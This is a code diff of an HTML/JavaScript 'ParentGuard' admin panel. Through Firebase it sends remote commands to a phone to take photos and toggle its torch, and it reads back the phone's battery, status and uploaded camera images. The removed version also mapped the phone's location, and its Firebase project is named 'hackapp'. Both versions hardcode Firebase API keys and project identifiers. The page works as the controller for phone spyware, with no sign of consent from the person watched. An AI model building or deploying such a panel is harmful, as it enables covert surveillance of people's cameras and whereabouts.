@@ -1,241 +1,174 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Admin Panel – Battery + Location + Camera + Torch</title>
+  <title>ParentGuard • Minimal Admin (Debug)</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    :root { --bg:#0b1220; --card:#121a2b; --text:#e6eefc; --muted:#9bb0d6; }
-    *{box-sizing:border-box}
-    body{margin:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial}
-    .wrap{max-width:820px;margin:32px auto;padding:20px}
-    .card{background:var(--card);border:1px solid #1e2a44;border-radius:16px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,.25)}
-    h1{margin:0 0 8px;font-weight:700;font-size:28px}
-    p{margin:6px 0;color:var(--muted)}
-    .row{display:flex;gap:14px;flex-wrap:wrap;margin:18px 0}
-    .input,button{background:#0e1627;color:var(--text);border:1px solid #25324c;border-radius:12px;padding:10px 14px;font-size:14px}
-    button{cursor:pointer}
-    .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
-    .tile{background:#0e1627;border:1px solid #25324c;border-radius:14px;padding:14px}
-    .big{font-size:44px;font-weight:800;letter-spacing:1px}
-    .ok{color:#6ee7a9} .low{color:#f59f85} .crit{color:#fb7185}
-    .list{max-height:260px;overflow:auto;border:1px dashed #2a395d;border-radius:12px;padding:8px}
-    .item{display:flex;justify-content:space-between;padding:8px 10px;border-bottom:1px solid #1a2540}
-    .item:last-child{border-bottom:0}
-    .ts{color:#90a7cf;font-variant-numeric:tabular-nums}
-    .popup {
-      display: none;
-      position: fixed;
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      background: #0a223d;
-      border: 2px solid #00e0ff;
-      padding: 20px;
-      border-radius: 15px;
-      text-align: center;
-      color: #00e0ff;
-      box-shadow: 0 0 25px #00e0ff;
-      z-index: 9999;
-    }
-    .popup iframe, .popup img {
-      width: 320px;
-      height: 320px;
-      border-radius: 10px;
-      margin-top: 10px;
-      object-fit: cover;
-    }
-    .close-btn {
-      background: #ff004c;
-      border: none;
-      padding: 10px 15px;
-      margin-top: 15px;
-      color: white;
-      border-radius: 10px;
-      cursor: pointer;
-    }
+    html,body{background:#0b1220;color:#e6eefc;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto}
+    .glass{backdrop-filter:blur(10px);background:linear-gradient(180deg,rgba(255,255,255,.06),rgba(255,255,255,.02));border:1px solid rgba(255,255,255,.08)}
+    .ring{box-shadow:0 0 0 1px #23314f inset}
   </style>
-
-  <!-- Firebase SDK -->
+  <!-- Firebase compat (Realtime DB) -->
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 </head>
 <body>
-  <div class="wrap">
-    <div class="card">
-      <h1>Battery + Location + Camera + Torch</h1>
-      <p>Firebase से live data</p>
+  <div class="max-w-4xl mx-auto p-5 space-y-5">
+    <header class="glass ring rounded-2xl p-4 flex items-center gap-3">
+      <div class="w-9 h-9 rounded-xl bg-sky-500/20 grid place-items-center">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-sky-400" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm1 14.59V18h-2v-1.41l-3.3-3.3 1.42-1.42L11 13.17V8h2v5.17l1.88-1.88 1.42 1.42L13 16.59z"/></svg>
+      </div>
+      <div>
+        <h1 class="text-lg font-bold">ParentGuard — Minimal Admin</h1>
+        <p class="text-xs text-slate-300">Battery • Location • Commands — with built‑in Debugger</p>
+      </div>
+      <div class="ml-auto text-xs text-slate-300 flex items-center gap-2"><span id="live" class="inline-flex items-center gap-2"><span class="w-2.5 h-2.5 rounded-full bg-red-400 animate-pulse"></span> Disconnected</span></div>
+    </header>
 
-      <div class="row">
-        <label>
-          <div style="margin-bottom:6px;color:#9bb0d6">Child Path</div>
-          <input id="path" class="input" style="width:260px" value="ParentGuard/users/child1" />
+    <!-- Config -->
+    <section class="glass ring rounded-2xl p-4 space-y-3">
+      <h2 class="text-base font-semibold">Firebase Config</h2>
+      <div class="grid sm:grid-cols-2 gap-3 text-xs">
+        <label>databaseURL<input id="cfgDbUrl" class="w-full bg-slate-900/60 ring rounded-xl px-3 py-2 text-sm mt-1" value="https://user-bd87e-default-rtdb.firebaseio.com"/></label>
+        <label>apiKey<input id="cfgApiKey" class="w-full bg-slate-900/60 ring rounded-xl px-3 py-2 text-sm mt-1" value="AIzaSyCR5-aZKw7dKIgEzW9kKs8s7mSZ-Jd8CUs"/></label>
+        <label>authDomain<input id="cfgAuthDomain" class="w-full bg-slate-900/60 ring rounded-xl px-3 py-2 text-sm mt-1" value="user-bd87e.firebaseapp.com"/></label>
+        <label>projectId<input id="cfgProjectId" class="w-full bg-slate-900/60 ring rounded-xl px-3 py-2 text-sm mt-1" value="user-bd87e"/></label>
+        <label>storageBucket<input id="cfgBucket" class="w-full bg-slate-900/60 ring rounded-xl px-3 py-2 text-sm mt-1" value="user-bd87e.appspot.com"/></label>
+        <label>messagingSenderId<input id="cfgSender" class="w-full bg-slate-900/60 ring rounded-xl px-3 py-2 text-sm mt-1" value="365506680148"/></label>
+        <label>appId<input id="cfgAppId" class="w-full bg-slate-900/60 ring rounded-xl px-3 py-2 text-sm mt-1" value="1:365506680148:android:7c3422aa52a8f6e32d24c1"/></label>
+      </div>
+      <div class="flex gap-2 pt-2">
+        <button id="btnInit" class="px-3 py-2 rounded-xl bg-sky-500 hover:bg-sky-400 text-sm font-medium">Init / Re‑Init</button>
+        <button id="btnKill" class="px-3 py-2 rounded-xl bg-slate-700 hover:bg-slate-600 text-sm">Disconnect</button>
+      </div>
+    </section>
+
+    <!-- Path + Actions -->
+    <section class="glass ring rounded-2xl p-4 space-y-3">
+      <h2 class="text-base font-semibold">Path & Actions</h2>
+      <div class="grid sm:grid-cols-2 gap-3">
+        <label class="text-xs">Child Path (e.g. <code>Users/child1</code>)
+          <input id="childPath" class="w-full bg-slate-900/60 ring rounded-xl px-3 py-2 text-sm mt-1" value="Users/child1"/>
         </label>
-        <button id="connect">🔋 Connect Battery</button>
-        <button onclick="showLocation()">📍 Show Location</button>
-        <button onclick="takePhoto()">📷 Take Photo</button>
-        <button onclick="torchOn()">💡 Torch ON</button>
-        <button onclick="torchOff()">❌ Torch OFF</button>
-        <span id="status" style="align-self:center;color:#9bb0d6">Not connected</span>
-      </div>
-
-      <div class="grid">
-        <div class="tile">
-          <div style="color:#9bb0d6">Current Battery</div>
-          <div id="battery" class="big">--%</div>
-          <div id="lastUpdate" class="ts">—</div>
-        </div>
-        <div class="tile">
-          <div style="color:#9bb0d6">Health</div>
-          <div id="health" class="big">—</div>
-          <div class="ts">Auto-classified</div>
+        <div class="flex items-end gap-2">
+          <button id="btnConnect" class="px-3 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-sm font-medium">Connect</button>
+          <button id="btnDisconnect" class="px-3 py-2 rounded-xl bg-rose-500/90 hover:bg-rose-500 text-sm">Detach</button>
         </div>
       </div>
 
-      <h3 style="margin:18px 0 8px">Recent Entries</h3>
-      <div id="list" class="list"></div>
-    </div>
-  </div>
+      <div class="grid sm:grid-cols-3 gap-3 pt-2">
+        <button id="btnTorchOn" class="rounded-xl bg-emerald-600/90 hover:bg-emerald-600 px-3 py-2 text-sm font-semibold">💡 Torch ON</button>
+        <button id="btnTorchOff" class="rounded-xl bg-rose-600/90 hover:bg-rose-600 px-3 py-2 text-sm font-semibold">❌ Torch OFF</button>
+        <button id="btnTakePhoto" class="rounded-xl bg-amber-500/90 hover:bg-amber-500 px-3 py-2 text-sm font-semibold">📷 Take Photo</button>
+      </div>
 
-  <!-- Location Popup -->
-  <div id="locationPopup" class="popup">
-    <h2>User Location</h2>
-    <p id="locationText">Fetching location...</p>
-    <iframe id="mapFrame"></iframe><br>
-    <button class="close-btn" onclick="closePopup('locationPopup')">Close</button>
-  </div>
+      <div class="grid sm:grid-cols-3 gap-3 pt-2">
+        <button id="btnWriteTest" class="rounded-xl bg-sky-600/90 hover:bg-sky-600 px-3 py-2 text-sm font-semibold">🧪 Write Test Battery=77</button>
+        <button id="btnReadNow" class="rounded-xl bg-indigo-600/90 hover:bg-indigo-600 px-3 py-2 text-sm font-semibold">🔄 Read Now</button>
+        <button id="btnClearLogs" class="rounded-xl bg-slate-700/90 hover:bg-slate-700 px-3 py-2 text-sm font-semibold">🧹 Clear Camera URL</button>
+      </div>
+    </section>
 
-  <!-- Camera Popup -->
-  <div id="cameraPopup" class="popup">
-    <h2>User Camera</h2>
-    <p id="cameraStatus">Waiting for photo...</p>
-    <img id="cameraImage" src="" alt="User photo"/>
-    <br>
-    <button class="close-btn" onclick="closePopup('cameraPopup')">Close</button>
+    <!-- Live Values -->
+    <section class="glass ring rounded-2xl p-4 grid sm:grid-cols-3 gap-3">
+      <div>
+        <div class="text-xs text-slate-300">Battery</div>
+        <div id="statBattery" class="text-4xl font-extrabold tracking-tight">--%</div>
+        <div id="lastUpdate" class="text-xs text-slate-400 mt-1">—</div>
+      </div>
+      <div>
+        <div class="text-xs text-slate-300">Status</div>
+        <div id="statStatus" class="text-4xl font-extrabold tracking-tight">—</div>
+      </div>
+      <div>
+        <div class="text-xs text-slate-300">Camera URL</div>
+        <div class="text-xs break-all" id="camUrl">—</div>
+      </div>
+    </section>
+
+    <!-- Logs / Debug Console -->
+    <section class="glass ring rounded-2xl p-4">
+      <div class="flex items-center justify-between mb-2">
+        <h2 class="text-base font-semibold">Debug Console</h2>
+        <button id="btnClearConsole" class="text-xs bg-slate-700 hover:bg-slate-600 rounded-lg px-2 py-1">Clear</button>
+      </div>
+      <pre id="console" class="bg-slate-900/70 rounded-xl p-3 text-xs overflow-auto max-h-72"></pre>
+    </section>
   </div>
 
   <script>
-    // Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyBeNsxHh_EvN-9E7Tp3c96lU7cq0FhZNqg",
-      authDomain: "https://hackapp-aff40.firebaseapp.com/__/auth/handler",
-      databaseURL: "https://hackapp-aff40-default-rtdb.firebaseio.com",
-      projectId: "hackapp-aff40",
-      storageBucket: "hackapp-aff40.firebasestorage.app",
-      messagingSenderId: "1000037921919",
-      appId: "1:1000037921919:android:26df39932d4695def63b4a"
-    };
+    // ======= State =======
+    let app = null; let db = null; let base = null;
+    let refBattery = null, refStatus = null, refCam = null;
 
-    const app = firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    // ======= UI helpers =======
+    const $ = (id)=>document.getElementById(id);
+    function log(...args){ const c = $("console"); c.textContent += args.join(' ') + "\n"; c.scrollTop = c.scrollHeight; }
+    function toast(txt){ log('> ', txt); }
+    function setLive(on){ $("live").innerHTML = on? '<span class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-pulse"></span> Live' : '<span class="w-2.5 h-2.5 rounded-full bg-red-400 animate-pulse"></span> Disconnected'; }
 
-    const ui = {
-      status: document.getElementById('status'),
-      battery: document.getElementById('battery'),
-      last: document.getElementById('lastUpdate'),
-      health: document.getElementById('health'),
-      list: document.getElementById('list'),
-      path: document.getElementById('path'),
-      connect: document.getElementById('connect')
-    };
-
-    let currentRef = null;
-
-    function classify(level){
-      if(level == null || isNaN(level)) return {label:'—', cls:''};
-      const n = Number(level);
-      if(n >= 80) return {label:'OK', cls:'ok'};
-      if(n >= 30) return {label:'LOW', cls:'low'};
-      return {label:'CRITICAL', cls:'crit'};
+    // ======= Firebase init / kill =======
+    function init(){
+      try{ if(firebase.apps?.length){ firebase.apps.forEach(a=>a.delete?.()); } }catch(e){ log('ignore delete error', e?.message); }
+      const cfg = {
+        apiKey: $("cfgApiKey").value.trim(),
+        authDomain: $("cfgAuthDomain").value.trim(),
+        databaseURL: $("cfgDbUrl").value.trim(),
+        projectId: $("cfgProjectId").value.trim(),
+        storageBucket: $("cfgBucket").value.trim(),
+        messagingSenderId: $("cfgSender").value.trim(),
+        appId: $("cfgAppId").value.trim(),
+      };
+      log('Init with', JSON.stringify(cfg));
+      app = firebase.initializeApp(cfg);
+      db = firebase.database();
+      toast('Firebase initialized');
     }
 
-    function attach(path){
-      if(currentRef) currentRef.off();
-      ui.status.textContent = 'Connecting…';
-      const ref = db.ref(path);
-      currentRef = ref;
+    function kill(){ try{ if(firebase.apps?.length){ firebase.apps.forEach(a=>a.delete?.()); } }catch{} app=null; db=null; setLive(false); toast('Disconnected'); }
 
-      ref.limitToLast(20).on('value', snap => {
-        const data = snap.val() || {};
-        const items = Object.entries(data);
-        items.sort((a,b)=> a[0].localeCompare(b[0]));
-
-        ui.list.innerHTML = '';
-        let lastVal = null, lastKey = null;
-        for(const [key, val] of items){
-          const b = (val && (val.battery ?? val.level ?? val.Battery ?? val.BATTERY));
-          const row = document.createElement('div');
-          row.className = 'item';
-          row.innerHTML = `<span>🔋 ${b ?? '—'}%</span><span class="ts">${key}</span>`;
-          ui.list.appendChild(row);
-          lastVal = b; lastKey = key;
-        }
-
-        if(lastVal != null){
-          ui.battery.textContent = `${lastVal}%`;
-          const c = classify(lastVal);
-          ui.health.textContent = c.label;
-          ui.health.className = 'big ' + c.cls;
-          ui.last.textContent = `Last update: ${lastKey}`;
-          ui.status.textContent = 'Live';
-        } else {
-          ui.battery.textContent = '--%';
-          ui.health.textContent = '—';
-          ui.health.className = 'big';
-          ui.last.textContent = 'No data yet';
-          ui.status.textContent = 'Waiting for data…';
-        }
-      });
+    // ======= Attach / Detach listeners =======
+    function attach(){
+      if(!db){ toast('Init first'); return; }
+      base = $("childPath").value.trim();
+      if(!base){ toast('Set child path'); return; }
+      detach();
+      setLive(true);
+      // Battery
+      refBattery = db.ref(`${base}/Battery`);
+      refBattery.on('value', s=>{ const v=s.val(); $("statBattery").textContent=(v!=null?v:'--')+"%"; $("lastUpdate").textContent='Updated '+new Date().toLocaleTimeString(); log('Battery =>', v); });
+      // Status
+      refStatus = db.ref(`${base}/Status`);
+      refStatus.on('value', s=>{ const v=s.val(); $("statStatus").textContent=v||'—'; log('Status =>', v); });
+      // Camera
+      refCam = db.ref(`${base}/camera_result`);
+      refCam.on('value', s=>{ const v=s.val(); $("camUrl").textContent=v||'—'; log('Camera URL =>', v); });
+      toast('Attached to '+base);
     }
 
-    ui.connect.addEventListener('click', ()=> attach(ui.path.value.trim()));
+    function detach(){ if(refBattery) refBattery.off(); if(refStatus) refStatus.off(); if(refCam) refCam.off(); $("statBattery").textContent='--%'; $("statStatus").textContent='—'; $("camUrl").textContent='—'; }
 
-    // Location popup
-    function showLocation() {
-      let popup = document.getElementById("locationPopup");
-      popup.style.display = "block";
+    // ======= Commands & Tests =======
+    function write(path, obj){ if(!db){ toast('Init first'); return; } db.ref(path).update(obj).then(()=>toast('Wrote '+path)).catch(e=>toast('ERR '+e.message)); }
 
-      db.ref(ui.path.value.trim() + "/location").once("value").then(snap=>{
-        const loc = snap.val();
-        if(loc && loc.lat && loc.lon){
-          document.getElementById("locationText").innerText = `Lat: ${loc.lat}, Lon: ${loc.lon}`;
-          document.getElementById("mapFrame").src = `https://www.google.com/maps?q=${loc.lat},${loc.lon}&z=15&output=embed`;
-        } else {
-          document.getElementById("locationText").innerText = "Location not available!";
-        }
-      });
-    }
+    $("btnWriteTest").onclick = ()=>{ const p=$("childPath").value.trim(); if(!p) return toast('Set child path'); write(`${p}`, { Battery: 77, Status: 'online' }); };
+    $("btnReadNow").onclick   = ()=>{ const p=$("childPath").value.trim(); if(!p) return toast('Set child path'); db.ref(`${p}`).once('value').then(s=>{ log('READ NOW =>', JSON.stringify(s.val(),null,2)); }); };
+    $("btnClearLogs").onclick  = ()=>{ const p=$("childPath").value.trim(); if(!p) return toast('Set child path'); db.ref(`${p}/camera_result`).set(null); };
 
-    // Camera popup
-    function takePhoto(){
-      let popup = document.getElementById("cameraPopup");
-      popup.style.display = "block";
-      document.getElementById("cameraStatus").innerText = "Requesting photo...";
-      db.ref("commands").update({camera:true});
-    }
+    $("btnTorchOn").onclick  = ()=>{ const p=$("childPath").value.trim(); write(`${p}/commands`, { torch: true, ts: Date.now() }); };
+    $("btnTorchOff").onclick = ()=>{ const p=$("childPath").value.trim(); write(`${p}/commands`, { torch: false, ts: Date.now() }); };
+    $("btnTakePhoto").onclick = ()=>{ const p=$("childPath").value.trim(); write(`${p}/commands`, { camera: true, ts: Date.now() }); };
 
-    // Torch control
-    function torchOn(){
-      db.ref("commands").update({torch:true});
-      alert("Torch ON command sent!");
-    }
+    // ======= Bind =======
+    $("btnInit").onclick = init; $("btnKill").onclick = kill;
+    $("btnConnect").onclick = attach; $("btnDisconnect").onclick = detach;
 
-    function torchOff(){
-      db.ref("commands").update({torch:false});
-      alert("Torch OFF command sent!");
-    }
-
-    // Listen for uploaded photo URL
-    db.ref("camera_result").on("value", snap=>{
-      const url = snap.val();
-      if(url){
-        document.getElementById("cameraStatus").innerText = "Photo received:";
-        document.getElementById("cameraImage").src = url;
-      }
-    });
-
-    function closePopup(id) {
-      document.getElementById(id).style.display = "none";
-    }
+    // Auto init on load using default values
+    window.addEventListener('load', init);
+    $("btnConnect").addEventListener('click', ()=> setTimeout(()=>$("btnReadNow").click(), 400));
+    $("btnClearConsole").onclick = ()=>($("console").textContent='');
   </script>
 </body>
 </html>
